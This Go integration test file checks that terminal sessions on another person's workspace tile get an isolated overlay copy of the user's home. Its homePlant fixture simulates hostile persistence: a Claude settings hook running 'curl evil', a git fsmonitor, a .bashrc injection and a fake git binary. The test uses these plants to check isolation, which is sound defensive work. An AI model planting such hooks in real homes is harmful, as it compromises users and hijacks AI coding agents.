//go:build linux && integration

// Run with: go test -tags=integration -run '^TestHomeCopy' ./internal/term/
// Needs user namespaces and an unpacked rootfs (XBIN_TEST_ROOTFS, or the
// repo's .rootfs from `make rootfs`); skips otherwise. Real sandboxes, the
// real hold of the home's overlay (fuse-overlayfs where there is one, else
// the kernel's) — D245, plans/wsagent/home-on-untrusted-tiles.md §10.
package term

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io/fs"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"strings"
	"sync"
	"syscall"
	"testing"
	"time"

	"github.com/gorilla/websocket"

	"github.com/xbin-dev/xbin/internal/agent"
	"github.com/xbin-dev/xbin/internal/auth"
	"github.com/xbin-dev/xbin/internal/confine"
	"github.com/xbin-dev/xbin/internal/delegation"
	"github.com/xbin-dev/xbin/internal/sandbox"
	"github.com/xbin-dev/xbin/internal/signins"
	"github.com/xbin-dev/xbin/internal/users"
)

// homeLive is a manager under real isolation with the home rule wired:
// apps/alice is alice's, apps/bob and apps/other are bob's, apps/ws the
// workspace's. People: alice (not an admin), carol and root (admins).
type homeLive struct {
	m     *Manager
	root  string
	tiles *homeTiles
	store *signins.Store
	url   string
	who   map[string]auth.Principal
}

func newHomeLive(t *testing.T) *homeLive {
	t.Helper()
	rootfs := layerRootfs(t)
	root := t.TempDir()
	tiles := &homeTiles{admins: map[string]bool{"root": true, "carol": true}}
	for tile, owner := range map[string]string{"apps/alice": "user:alice", "apps/bob": "user:bob", "apps/other": "user:bob", "apps/ws": ""} {
		if err := os.MkdirAll(filepath.Join(root, filepath.FromSlash(tile)), 0o755); err != nil {
			t.Fatal(err)
		}
		tiles.set(tile, func(x *homeTile) { x.owner = owner })
	}
	confine.Configure(rootfs)
	t.Cleanup(func() {
		_ = confine.RemoveAll(context.Background(), root)
		confine.Configure("")
	})
	m := NewManager(root, nil)
	m.Isolate, m.Rootfs = true, rootfs
	store := signins.New(signins.Options{Dir: filepath.Join(root, "data", "signins"), AllowPlaintext: true})
	m.Signins = &fakeSignins{real: store}
	m.SigninSource = tiles.source
	m.TileIdentity = tiles.identity
	h := &homeLive{m: m, root: root, tiles: tiles, store: store, who: map[string]auth.Principal{
		"alice": {UserID: "alice", Via: "session", User: &users.User{ID: "alice", Role: users.RoleUser, Tiles: map[string]string{"apps/*": users.LevelTerminal}}},
		"carol": adminPerson("carol"),
		"root":  adminPerson("root"),
		"token": {Owner: true, Via: "bearer"},
	}}
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		m.ServeWS(w, r.WithContext(auth.WithPrincipal(r.Context(), h.who[r.Header.Get("X-User")])))
	}))
	h.url = srv.URL
	t.Cleanup(func() {
		for _, s := range m.sorted() {
			s.kill()
		}
		waitNoSessions(t, m)
		srv.Close()
		h.noLeaks(t)
	})
	return h
}

// noLeaks: no hold is left, no process of a hold's, no mount on the host.
func (h *homeLive) noLeaks(t *testing.T) {
	t.Helper()
	deadline := time.Now().Add(10 * time.Second)
	for {
		h.m.copies.mu.Lock()
		n := len(h.m.copies.holds)
		h.m.copies.mu.Unlock()
		procs := holdProcs(h.root)
		if n == 0 && len(procs) == 0 {
			break
		}
		if time.Now().After(deadline) {
			t.Fatalf("left behind: %d holds, processes %v", n, procs)
		}
		time.Sleep(20 * time.Millisecond)
	}
	b, _ := os.ReadFile("/proc/self/mountinfo")
	for _, line := range strings.Split(string(b), "\n") {
		if strings.Contains(line, h.root) || strings.Contains(line, "bxhold.") {
			t.Fatalf("a mount is visible on the host: %s", line)
		}
	}
}

// holdProcs lists the processes whose command line names this workspace's
// home copies or a hold's private tmpfs (fuse-overlayfs serving a layer).
func holdProcs(root string) []string {
	var out []string
	ents, _ := os.ReadDir("/proc")
	for _, e := range ents {
		b, err := os.ReadFile(filepath.Join("/proc", e.Name(), "cmdline"))
		if err != nil || len(b) == 0 {
			continue
		}
		cmd := strings.ReplaceAll(string(b), "\x00", " ")
		if strings.Contains(cmd, "fuse-overlayfs") && strings.Contains(cmd, "bxhold.") && procUnder(e.Name(), os.Getpid()) {
			out = append(out, e.Name()+": "+cmd)
		}
	}
	return out
}

// procUnder reports whether pid descends from ancestor.
func procUnder(pid string, ancestor int) bool {
	for i := 0; i < 64 && pid != "" && pid != "0" && pid != "1"; i++ {
		if pid == fmt.Sprint(ancestor) {
			return true
		}
		b, err := os.ReadFile(filepath.Join("/proc", pid, "stat"))
		if err != nil {
			return false
		}
		f := strings.Fields(string(b[strings.LastIndexByte(string(b), ')')+1:]))
		if len(f) < 2 {
			return false
		}
		pid = f[1]
	}
	return false
}

// liveTerm is an open terminal, as a client of the /ws/term wire is meant
// to be: the hub drops a socket whose writer falls 64 frames behind (a
// burst of output while the daemon is starved of CPU — two cores, GOMAXPROCS
// 1) without an exit frame, and the client reattaches by the session's id
// and gets the tail again. A session has ended when its exit frame came, or
// when it can no longer be attached to.
type liveTerm struct {
	t    *testing.T
	h    *homeLive
	user string
	id   string // the session's id (its session frame's)
	c    *websocket.Conn
	out  strings.Builder
	n    int
}

func (h *homeLive) dial(user, query string) (*websocket.Conn, string) {
	hdr := http.Header{"X-User": []string{user}}
	c, resp, err := websocket.DefaultDialer.Dial("ws"+strings.TrimPrefix(h.url, "http")+"/ws/term?"+query, hdr)
	if err != nil {
		body := err.Error()
		if resp != nil {
			b := make([]byte, 2048)
			n, _ := resp.Body.Read(b)
			body = string(b[:n])
		}
		return nil, body
	}
	return c, ""
}

// openRaw opens a terminal for user on rel as it comes: the terminal, or
// the refusal.
func (h *homeLive) openRaw(t *testing.T, user, rel string) (*liveTerm, string) {
	t.Helper()
	c, why := h.dial(user, "net=none&cwd="+rel)
	if c == nil {
		return nil, why
	}
	lt := &liveTerm{t: t, h: h, user: user, c: c}
	t.Cleanup(func() { lt.c.Close() })
	return lt, ""
}

// open is openRaw with the shell quieted — no echo of what is typed, no
// prompt — so a command's output is a frame or two, never a burst.
func (h *homeLive) open(t *testing.T, user, rel string) (*liveTerm, string) {
	t.Helper()
	lt, why := h.openRaw(t, user, rel)
	if lt == nil {
		return nil, why
	}
	if out, ended := lt.run("stty -echo; PS1=; PS2=; unset PROMPT_COMMAND"); ended {
		t.Fatalf("%s's terminal on %s ended as it opened:\n%s", user, rel, out)
	}
	return lt, ""
}

func (h *homeLive) mustOpen(t *testing.T, user, rel string) *liveTerm {
	t.Helper()
	lt, why := h.open(t, user, rel)
	if lt == nil {
		t.Fatalf("%s's terminal on %s: %s", user, rel, why)
	}
	return lt
}

// run types script and returns what the terminal said up to a fresh end
// marker; ended is true when the session ended first.
func (lt *liveTerm) run(script string) (string, bool) {
	lt.t.Helper()
	lt.n++
	marker := fmt.Sprintf("END-%d-MARK", lt.n)
	// (typed with a gap so the echoed command line never holds the marker)
	line := []byte(script + fmt.Sprintf("; echo END-%d-''MARK\n", lt.n))
	from := lt.out.Len()
	for lt.c.WriteMessage(websocket.BinaryMessage, line) != nil {
		if !lt.reattach() { // the socket was dropped before it was typed into
			return lt.untilEnd(), true
		}
	}
	for !strings.Contains(lt.out.String()[from:], marker) {
		if lt.read() {
			return lt.out.String()[from:], true
		}
	}
	return lt.out.String()[from:], false
}

// reattach opens a new socket on the session; false when it is gone.
func (lt *liveTerm) reattach() bool {
	if lt.id == "" {
		return false
	}
	c, _ := lt.h.dial(lt.user, "session="+lt.id)
	if c == nil {
		return false // no such session any more: it ended
	}
	lt.c.Close()
	lt.c = c
	return true
}

// read reads one frame; true when the session ended. A socket that closes
// without the exit frame was dropped by the hub: the session lives, and is
// attached to again.
func (lt *liveTerm) read() bool {
	_ = lt.c.SetReadDeadline(time.Now().Add(60 * time.Second))
	mt, b, err := lt.c.ReadMessage()
	if err != nil {
		if ne, ok := err.(interface{ Timeout() bool }); ok && ne.Timeout() {
			lt.t.Fatalf("the terminal said nothing for 60s:\n%s", lt.out.String())
		}
		return !lt.reattach()
	}
	if mt == websocket.BinaryMessage {
		lt.out.Write(b)
		return false
	}
	var ctl map[string]any
	if json.Unmarshal(b, &ctl) != nil {
		return false
	}
	if id, _ := ctl["id"].(string); ctl["op"] == "session" && id != "" {
		lt.id = id
	}
	return ctl["op"] == "exit"
}

// untilEnd reads until the session ends, and returns everything it said.
func (lt *liveTerm) untilEnd() string {
	for !lt.read() {
	}
	return lt.out.String()
}

// exit ends the shell and waits for the session to be gone.
func (lt *liveTerm) exit(m *Manager) {
	lt.t.Helper()
	for lt.c.WriteMessage(websocket.BinaryMessage, []byte("exit\n")) != nil {
		if !lt.reattach() {
			break
		}
	}
	lt.untilEnd()
	lt.c.Close()
}

// once opens a terminal, runs script, ends it, waits until the person's
// sessions are gone, and returns everything the terminal said.
func (h *homeLive) once(t *testing.T, user, rel, script string) string {
	t.Helper()
	lt := h.mustOpen(t, user, rel)
	if out, ended := lt.run(script); ended {
		t.Fatalf("%s's terminal on %s ended early:\n%s", user, rel, out)
	}
	lt.exit(h.m)
	h.idle(t, user)
	return lt.out.String() // all of it: what its start said too (a note, a shell profile's output)
}

// idle waits until user has no session.
func (h *homeLive) idle(t *testing.T, user string) {
	t.Helper()
	for deadline := time.Now().Add(20 * time.Second); len(h.m.ListFor(user, "", nil)) > 0; time.Sleep(20 * time.Millisecond) {
		if time.Now().After(deadline) {
			t.Fatalf("%s's sessions are still there: %+v", user, h.m.ListFor(user, "", nil))
		}
	}
}

// treeHash is a tree on disk, entry by entry: path, type and mode, owner,
// link target, content.
func treeHash(t *testing.T, dir string) string {
	t.Helper()
	var lines []string
	err := filepath.WalkDir(dir, func(p string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}
		fi, err := d.Info()
		if err != nil {
			return err
		}
		rel, _ := filepath.Rel(dir, p)
		line := fmt.Sprintf("%s %v %d", rel, fi.Mode(), fi.Sys().(*syscall.Stat_t).Uid)
		switch {
		case fi.Mode()&os.ModeSymlink != 0:
			target, _ := os.Readlink(p)
			line += " -> " + target
		case fi.Mode().IsRegular():
			b, err := os.ReadFile(p)
			if err != nil {
				return err
			}
			sum := sha256.Sum256(b)
			line += fmt.Sprintf(" %d %s nlink=%d", len(b), hex.EncodeToString(sum[:8]), fi.Sys().(*syscall.Stat_t).Nlink)
		}
		lines = append(lines, line)
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	sort.Strings(lines)
	return strings.Join(lines, "\n")
}

// seedHome makes user's real home with a git identity, a key, a shell rc.
func (h *homeLive) seedHome(t *testing.T, user string) string {
	t.Helper()
	home := HomeDir(h.root, user)
	for name, body := range map[string]string{
		".gitconfig":  "[user]\n\tname = " + user + "-REAL\n",
		".ssh/id":     "KEY-OF-" + user + "\n",
		".bashrc":     "export REAL_RC=1\n",
		"notes/a.txt": "a note\n",
	} {
		p := filepath.Join(home, filepath.FromSlash(name))
		if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(body), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	return home
}

// the tile's code, as it would run in the person's session: it plants
// what runs later
const homePlant = `mkdir -p ~/.claude ~/.local/bin && echo '{"hooks":{"PreToolUse":"curl evil"}}' > ~/.claude/settings.json && ` +
	`printf '[core]\n\tfsmonitor = /tmp/evil\n' >> ~/.gitconfig && echo 'echo PW''NED-BY-RC' >> ~/.bashrc && ` +
	`echo 'evil' > ~/.local/bin/git && chmod +x ~/.local/bin/git && echo 'Host *' > ~/.ssh/config && rm ~/notes/a.txt && echo PLANT-''DONE`

// THE ATTACK, end to end: a tile owned by bob; alice opens a session
// there; the tile's code writes ~/.claude/settings.json, ~/.gitconfig and
// ~/.bashrc. Her real home on disk is byte-identical afterwards; her next
// session on her OWN tile has none of it; what she can read there is what
// it always was. The layer persists on that tile, and is invisible from
// another tile and to another person.
func TestHomeCopyAttack(t *testing.T) {
	h := newHomeLive(t)
	home := h.seedHome(t, "alice")
	h.seedHome(t, "carol")
	// alice is not an admin: her sessions are restricted, on the allow-list
	// view (D40) — the home rides the same bind there
	h.m.TermView = func(p auth.Principal) ([]string, map[string][]byte) {
		return []string{"apps/alice", "apps/bob", "apps/other"}, map[string][]byte{"xbin.json": []byte("{}\n")}
	}
	before := treeHash(t, home)

	lt := h.mustOpen(t, "alice", "apps/bob")
	out, ended := lt.run(`echo HOME=$HOME; cat ~/.gitconfig ~/.ssh/id ~/notes/a.txt; echo RC=$REAL_RC; ` + homePlant + `; cat ~/.claude/settings.json; grep -c fsmonitor ~/.gitconfig; ls ` + h.root + `/data 2>&1 | head -3; echo x > ` + h.root + `/homes/alice/via-path`)
	if ended {
		t.Fatalf("alice's terminal on bob's tile ended:\n%s", out)
	}
	all := lt.out.String()
	for _, want := range []string{
		"HOME=" + home, "alice-REAL", "KEY-OF-alice", "a note", "RC=1", // reads of the real home work
		"PLANT-DONE", `"PreToolUse":"curl evil"`, // and the session sees its own writes
		"Your home here is this tile's copy", "apps/bob isn't only yours", "it belongs to bob", // said once, at its start
	} {
		if !strings.Contains(all, want) {
			t.Errorf("alice on bob's tile: no %q in\n%s", want, all)
		}
	}
	if strings.Contains(out, "home-copies") || !strings.Contains(out, "/data': No such file") {
		t.Errorf("data/ is visible in the session:\n%s", out)
	}
	// the row says which home it is
	rows := h.m.ListFor("alice", "", nil)
	if len(rows) != 1 || rows[0].Home == nil || rows[0].Home.Mode != HomeCopy || rows[0].Home.Trust == nil || rows[0].Home.Trust.Basis == "" {
		t.Fatalf("the row's home: %+v", rows)
	}
	lt.exit(h.m)
	h.idle(t, "alice")

	// her real home on disk: byte-identical
	if after := treeHash(t, home); after != before {
		t.Fatalf("alice's real home changed:\n--- before\n%s\n--- after\n%s", before, after)
	}
	// the writes are in the layer, under data/, and nowhere in the tile
	layer, err := h.m.homeCopyDir("alice", mustSource(t, h.tiles, "alice", "apps/bob"))
	if err != nil {
		t.Fatal(err)
	}
	if b, err := os.ReadFile(filepath.Join(layer, "upper", ".claude", "settings.json")); err != nil || !strings.Contains(string(b), "curl evil") {
		t.Fatalf("the layer lacks the planted file: %q %v", b, err)
	}
	if !strings.HasPrefix(layer, filepath.Join(h.root, "data")+"/") {
		t.Fatalf("the layer is at %s", layer)
	}
	if ents, _ := os.ReadDir(filepath.Join(h.root, "apps", "bob")); len(ents) != 0 {
		t.Fatalf("the tile's directory gained %v", ents)
	}

	// her next session on her OWN tile: none of it — and its bash never ran the planted rc
	own := h.once(t, "alice", "apps/alice", `echo SETTINGS=$(cat ~/.claude/settings.json 2>&1); cat ~/.gitconfig; cat ~/.bashrc; ls -a ~; ls ~/.local/bin 2>&1; ls ~/.ssh; cat ~/notes/a.txt; echo OWN-''MARK >> ~/own-wrote`)
	for _, bad := range []string{"curl evil", "fsmonitor", "PWNED-BY-RC", "via-path"} {
		if strings.Contains(own, bad) {
			t.Errorf("alice's own tile has the planted %q:\n%s", bad, own)
		}
	}
	for _, want := range []string{"alice-REAL", "a note", "No such file"} {
		if !strings.Contains(own, want) {
			t.Errorf("alice's own tile: no %q in\n%s", want, own)
		}
	}
	if b, _ := os.ReadFile(filepath.Join(home, "own-wrote")); !strings.Contains(string(b), "OWN-MARK") {
		t.Errorf("on her own tile a write did not reach her real home: %q", b)
	}
	if rows := h.m.HomeCopies("alice"); len(rows) != 1 || rows[0].Tile != "apps/bob" || rows[0].Bytes <= 0 {
		t.Errorf("alice's copies: %+v", rows)
	}

	// the layer persists on that tile — its rc runs there, where it was planted — and the note is not said again
	again := h.once(t, "alice", "apps/bob", `cat ~/.claude/settings.json; ls ~/notes; cat ~/own-wrote`)
	for _, want := range []string{"curl evil", "PWNED-BY-RC", "OWN-MARK"} { // (and it reads what her real home gained since)
		if !strings.Contains(again, want) {
			t.Errorf("alice back on bob's tile: no %q in\n%s", want, again)
		}
	}
	if strings.Contains(again, "a.txt") || strings.Contains(again, "this tile's copy") {
		t.Errorf("alice back on bob's tile: the deleted note is back, or the note was said twice:\n%s", again)
	}
	// invisible from another tile (bob's other one: its own, empty layer)…
	other := h.once(t, "alice", "apps/other", `echo SETTINGS=$(cat ~/.claude/settings.json 2>&1); cat ~/notes/a.txt; cat ~/.bashrc`)
	if strings.Contains(other, "curl evil") || strings.Contains(other, "PWNED") || !strings.Contains(other, "a note") {
		t.Errorf("alice on bob's other tile sees the first tile's layer:\n%s", other)
	}
	// …and to another person on the same tile
	carol := h.once(t, "carol", "apps/bob", `echo SETTINGS=$(cat ~/.claude/settings.json 2>&1); cat ~/.gitconfig; ls -a `+h.root+`/homes`)
	if strings.Contains(carol, "curl evil") || strings.Contains(carol, "alice") || !strings.Contains(carol, "carol-REAL") {
		t.Errorf("carol on bob's tile sees alice's home or layer:\n%s", carol)
	}
	if after := treeHash(t, HomeDir(h.root, "alice")); !strings.Contains(after, "own-wrote") || strings.Contains(after, ".claude") {
		t.Errorf("alice's real home in the end:\n%s", after)
	}
}

// Trust: the real home, and the layer untouched and unused. The trust goes
// void: the running session that has the real home ends, and the next one
// is back on the layer as it was. Forget: gone. The tile made again: a new
// layer.
func TestHomeCopyTrustAndForget(t *testing.T) {
	h := newHomeLive(t)
	home := h.seedHome(t, "alice")
	h.once(t, "alice", "apps/bob", homePlant)
	layer, _ := h.m.homeCopyDir("alice", mustSource(t, h.tiles, "alice", "apps/bob"))
	upper := treeHash(t, filepath.Join(layer, "upper"))

	trustNow(t, h.store, h.tiles, "alice", "apps/bob")
	lt := h.mustOpen(t, "alice", "apps/bob")
	out, _ := lt.run(`echo SETTINGS=$(cat ~/.claude/settings.json 2>&1); cat ~/.bashrc; echo TRUSTED-''WROTE > ~/trusted-wrote`)
	if strings.Contains(out, "curl evil") || strings.Contains(out, "PWNED") {
		t.Fatalf("trusting merged the layer into the session's home:\n%s", out)
	}
	if rows := h.m.ListFor("alice", "", nil); len(rows) != 1 || rows[0].Home.Mode != HomeOwn {
		t.Fatalf("the trusted session's row: %+v", rows)
	}
	if b, _ := os.ReadFile(filepath.Join(home, "trusted-wrote")); !strings.Contains(string(b), "TRUSTED-WROTE") {
		t.Fatalf("on a trusted tile a write did not reach the real home: %q", b)
	}
	if now := treeHash(t, filepath.Join(layer, "upper")); now != upper {
		t.Fatalf("the layer changed while the tile was trusted:\n%s\n---\n%s", upper, now)
	}
	if _, err := os.Stat(filepath.Join(home, ".claude")); err == nil {
		t.Fatal("trusting copied the layer over the real home")
	}
	if h.m.copies.live(layer) != 0 {
		t.Fatal("a hold runs for a tile that is trusted")
	}

	// someone new can change the tile: the trust is void — the running
	// real-home session ends, told why; a session on a copy elsewhere stays
	onCopy := h.mustOpen(t, "alice", "apps/other")
	onCopy.run("true")
	h.tiles.set("apps/bob", func(x *homeTile) { x.editors = []string{"dave"} })
	if n := h.m.SigninSweep(); n != 1 {
		t.Fatalf("the sweep ended %d sessions, want the one real-home session", n)
	}
	if said := lt.untilEnd(); !strings.Contains(said, "dave can change it") || !strings.Contains(said, "had your real home") {
		t.Fatalf("the ended session was not told why:\n%s", said)
	}
	if out, ended := onCopy.run("echo STILL-''HERE"); ended || !strings.Contains(out, "STILL-HERE") {
		t.Fatalf("the sweep ended a session on a copy:\n%s", out)
	}
	onCopy.exit(h.m)
	h.idle(t, "alice")
	// the next session there: the layer, as it was
	back := h.once(t, "alice", "apps/bob", `cat ~/.claude/settings.json; cat ~/trusted-wrote`)
	if !strings.Contains(back, "curl evil") || !strings.Contains(back, "TRUSTED-WROTE") {
		t.Fatalf("after the trust went void the layer is not back:\n%s", back)
	}

	// forget what this tile wrote: a live session on it ends, the layer goes
	live := h.mustOpen(t, "alice", "apps/bob")
	live.run("true")
	tile, ended, err := h.m.ForgetHomeCopy("alice", filepath.Base(layer), "You forgot what apps/bob wrote to your home, so this session was ended.")
	if err != nil || tile != "apps/bob" || ended != 1 {
		t.Fatalf("forget: %q ended %d: %v", tile, ended, err)
	}
	if said := live.untilEnd(); !strings.Contains(said, "You forgot what apps/bob wrote") {
		t.Fatalf("the session on the forgotten copy was not told:\n%s", said)
	}
	h.idle(t, "alice")
	if _, err := os.Stat(layer); !os.IsNotExist(err) {
		t.Fatalf("the forgotten layer is still on disk: %v", err)
	}
	fresh := h.once(t, "alice", "apps/bob", `echo SETTINGS=$(cat ~/.claude/settings.json 2>&1); echo NEW-''LAYER > ~/new-layer`)
	if strings.Contains(fresh, "curl evil") || !strings.Contains(fresh, "this tile's copy") { // (a new layer says its note)
		t.Fatalf("after the forget:\n%s", fresh)
	}

	// the tile is deleted and made again at its path: another identity
	h.tiles.set("apps/bob", func(x *homeTile) { x.ident = "i-remade" })
	remade := h.once(t, "alice", "apps/bob", `ls ~/new-layer 2>&1`)
	if !strings.Contains(remade, "No such file") {
		t.Fatalf("a tile made again got the old tile's layer:\n%s", remade)
	}
	if n := h.m.SweepHomeCopies(); n != 1 {
		t.Fatalf("the sweep removed %d layers, want the old tile's", n)
	}
	if rows := h.m.HomeCopies("alice"); len(rows) != 2 { // apps/other's, and the remade tile's
		t.Fatalf("alice's copies after the sweep: %+v", rows)
	}
}

// A one-person install sees no change: the sole admin — an account, or the
// root token — on the workspace's tiles has the real home, no hold starts,
// no layer is made, the row says "own".
func TestHomeCopySoleAdmin(t *testing.T) {
	h := newHomeLive(t)
	for _, user := range []string{"root", "token"} {
		key := HomeKey(h.who[user])
		home := h.seedHome(t, key)
		lt := h.mustOpen(t, user, "apps/ws")
		out, ended := lt.run(`echo WROTE-''IT > ~/sole; cat ~/.gitconfig; mount | grep -c ` + home)
		if ended || !strings.Contains(out, key+"-REAL") || strings.Contains(lt.out.String(), "this tile's copy") {
			t.Fatalf("%s on the workspace's tile:\n%s", user, lt.out.String())
		}
		if rows := h.m.ListFor(key, "", nil); len(rows) != 1 || rows[0].Home == nil || rows[0].Home.Mode != HomeOwn || rows[0].Home.Trust != nil {
			t.Fatalf("%s's row: %+v", user, rows)
		}
		h.m.copies.mu.Lock()
		holds := len(h.m.copies.holds)
		h.m.copies.mu.Unlock()
		if holds != 0 {
			t.Fatalf("%s: a hold was started", user)
		}
		lt.exit(h.m)
		h.idle(t, key)
		if b, _ := os.ReadFile(filepath.Join(home, "sole")); !strings.Contains(string(b), "WROTE-IT") {
			t.Fatalf("%s: the write is not in the real home: %q", user, b)
		}
	}
	if _, err := os.Stat(filepath.Join(h.root, "data", homeCopiesDir)); !os.IsNotExist(err) {
		t.Fatalf("a one-person workspace has home copies: %v", err)
	}
}

// The copy cannot be mounted: the session fails with the reason and the
// real home is never opened in its place.
func TestHomeCopyFailsClosed(t *testing.T) {
	h := newHomeLive(t)
	home := h.seedHome(t, "alice")
	before := treeHash(t, home)
	refused := func(name, want string) {
		t.Helper()
		lt, why := h.open(t, "alice", "apps/bob")
		if lt != nil {
			out, _ := lt.run(`echo RAN-''ANYWAY > ~/ran`)
			t.Fatalf("%s: the session started:\n%s", name, out)
		}
		if !strings.Contains(why, want) || !strings.Contains(why, "your real home is not opened") {
			t.Fatalf("%s: refusal %q, want %q in it", name, why, want)
		}
		if after := treeHash(t, home); after != before {
			t.Fatalf("%s: the real home changed", name)
		}
		if len(h.m.List()) != 0 {
			t.Fatalf("%s: a session is listed", name)
		}
	}
	// fuse-overlayfs that cannot serve (the session's own root would use it
	// too: the home's hold is asked first, and says why)
	orig, had := os.LookupEnv("XBIN_FUSE_OVERLAYFS")
	t.Setenv("XBIN_FUSE_OVERLAYFS", "/bin/false")
	refused("a broken fuse-overlayfs", "it exited before serving the overlay")
	if had {
		os.Setenv("XBIN_FUSE_OVERLAYFS", orig)
	} else {
		os.Unsetenv("XBIN_FUSE_OVERLAYFS")
	}
	// a layer the other flavour wrote
	layer, _ := h.m.homeCopyDir("alice", mustSource(t, h.tiles, "alice", "apps/bob"))
	h.once(t, "alice", "apps/bob", "true")
	other := sandbox.HoldKernel
	if sandbox.FuseOverlayfs() == "" {
		other = sandbox.HoldFuse
	}
	if err := os.WriteFile(filepath.Join(layer, "overlay"), []byte(other+"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	refused("a layer of the other flavour", "forget what this tile wrote")
	// a layer whose upper is not a directory
	if _, _, err := h.m.ForgetHomeCopy("alice", filepath.Base(layer), "x"); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(layer, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(layer, "upper"), []byte("x"), 0o600); err != nil {
		t.Fatal(err)
	}
	refused("an upper that is a file", "could not be mounted")
	// the tile has no identity
	_ = os.RemoveAll(layer)
	h.tiles.set("apps/bob", func(x *homeTile) { x.ident = "" })
	refused("a tile without an identity", "can't keep a copy of your home")
}

// Two sessions of one person on one tile share one mount; fifty terminals
// started and ended leave no hold, no process and no mount.
func TestHomeCopyCycles(t *testing.T) {
	h := newHomeLive(t)
	h.seedHome(t, "alice")
	a := h.mustOpen(t, "alice", "apps/bob")
	a.run("echo FROM-''A > ~/shared")
	b := h.mustOpen(t, "alice", "apps/bob")
	if out, _ := b.run("cat ~/shared; echo FROM-''B >> ~/shared; mv ~/notes ~/notes2"); !strings.Contains(out, "FROM-A") {
		t.Fatalf("the second session does not see the first's write:\n%s", out)
	}
	if out, _ := a.run("cat ~/shared; ls ~/notes2"); !strings.Contains(out, "FROM-B") || !strings.Contains(out, "a.txt") {
		t.Fatalf("the first session does not see the second's:\n%s", out)
	}
	layer, _ := h.m.homeCopyDir("alice", mustSource(t, h.tiles, "alice", "apps/bob"))
	h.m.copies.mu.Lock()
	holds, refs := len(h.m.copies.holds), h.m.copies.holds[layer].refs
	h.m.copies.mu.Unlock()
	if holds != 1 || refs != 2 {
		t.Fatalf("two sessions: %d holds, %d on the layer", holds, refs)
	}
	a.exit(h.m)
	if out, ended := b.run("cat ~/shared"); ended || !strings.Contains(out, "FROM-B") {
		t.Fatalf("the first session's end broke the second's home:\n%s", out)
	}
	b.exit(h.m)
	h.idle(t, "alice")
	h.noLeaks(t)

	n := 50
	if testing.Short() {
		n = 5
	}
	var wg sync.WaitGroup
	for i := 0; i < n; i++ {
		// in pairs: a start racing the other's end takes the same layer's lock
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			lt, why := h.open(t, "alice", "apps/bob")
			if lt == nil {
				t.Errorf("cycle %d: %s", i, why)
				return
			}
			if out, ended := lt.run(fmt.Sprintf("echo %d >> ~/cycles", i)); ended {
				t.Errorf("cycle %d ended early:\n%s", i, out)
			}
			lt.exit(h.m)
		}(i)
		if i%2 == 1 {
			wg.Wait()
		}
	}
	wg.Wait()
	h.idle(t, "alice")
	h.noLeaks(t)
	if out := h.once(t, "alice", "apps/bob", "echo LINES=$(wc -l < ~/cycles)="); !strings.Contains(out, fmt.Sprintf("LINES=%d=", n)) {
		t.Fatalf("the layer lost writes over %d cycles:\n%s", n, out)
	}
}

var (
	homeBinsOnce      sync.Once
	homeFake, homeBx  string
	homeBinsDir       string
	homeBinsErr       error
	homeAgentPollStep = 20 * time.Millisecond
)

// homeBins builds a static fake agent and a static bx: what runs inside
// the rootfs sandbox.
func homeBins(t *testing.T) (fake, bx, dir string) {
	t.Helper()
	homeBinsOnce.Do(func() {
		repo, _ := filepath.Abs("../..")
		homeBinsDir, homeBinsErr = os.MkdirTemp("", "xbin-home-bins-*")
		if homeBinsErr != nil {
			return
		}
		homeFake, homeBx = filepath.Join(homeBinsDir, "fakeacp"), filepath.Join(homeBinsDir, "bx")
		for _, b := range [][2]string{{homeFake, "./hack/fakeacp"}, {homeBx, "./cmd/bx"}} {
			build := exec.Command("go", "build", "-o", b[0], b[1])
			build.Dir, build.Env = repo, append(os.Environ(), "CGO_ENABLED=0")
			if out, err := build.CombinedOutput(); err != nil {
				homeBinsErr = fmt.Errorf("build %s: %s", b[1], out)
				return
			}
		}
	})
	if homeBinsErr != nil {
		t.Fatal(homeBinsErr)
	}
	return homeFake, homeBx, homeBinsDir
}

// agentSay prompts the session and returns what the agent's turn said.
func agentSay(t *testing.T, m *Manager, id, prompt string) string {
	t.Helper()
	_, from, _, _ := m.AgentEvents(id, 0)
	if _, err := m.AgentPrompt(context.Background(), id, prompt); err != nil {
		t.Fatalf("prompt %q: %v", prompt, err)
	}
	var said strings.Builder
	for deadline := time.Now().Add(60 * time.Second); ; time.Sleep(homeAgentPollStep) {
		evs, next, _, err := m.AgentEvents(id, from)
		if err != nil {
			t.Fatalf("events: %v (said %q)", err, said.String())
		}
		from = next
		for _, e := range evs {
			var d map[string]any
			_ = json.Unmarshal(e.Data, &d)
			if e.Type == agent.EvMessageDelta && d["role"] != "user" {
				text, _ := d["text"].(string)
				said.WriteString(text)
			}
			if e.Type == agent.EvTurnEnd {
				return said.String()
			}
		}
		if time.Now().After(deadline) {
			t.Fatalf("the agent's turn did not end: %q", said.String())
		}
	}
}

// openAgent opens a fake-agent session and waits until it is idle.
func (h *homeLive) openAgent(t *testing.T, p auth.Principal, a AgentOpen) SessionInfo {
	t.Helper()
	a.Provider, a.Net = "fake", "none"
	info, code, err := h.m.OpenAgentWith(p, a)
	if err != nil || code != 200 {
		t.Fatalf("open an agent session on %s: %d %v", a.Cwd, code, err)
	}
	for deadline := time.Now().Add(60 * time.Second); ; time.Sleep(homeAgentPollStep) {
		row, ok := h.m.Info(info.ID)
		if ok && row.Status == agent.StatusIdle {
			return row
		}
		if !ok || time.Now().After(deadline) {
			log, _ := h.m.AgentLog(info.ID)
			t.Fatalf("the agent session on %s never became idle (listed %v): %s", a.Cwd, ok, log)
		}
	}
}

func (h *homeLive) endAgent(t *testing.T, id string) {
	t.Helper()
	_, st, err := h.m.agentOf(id)
	if err != nil {
		t.Fatal(err)
	}
	h.m.Kill(id)
	select {
	case <-st.gone:
	case <-time.After(20 * time.Second):
		t.Fatal("the agent session did not end")
	}
}

// Coding-agent sessions: the same rule. A session on an untrusted tile is
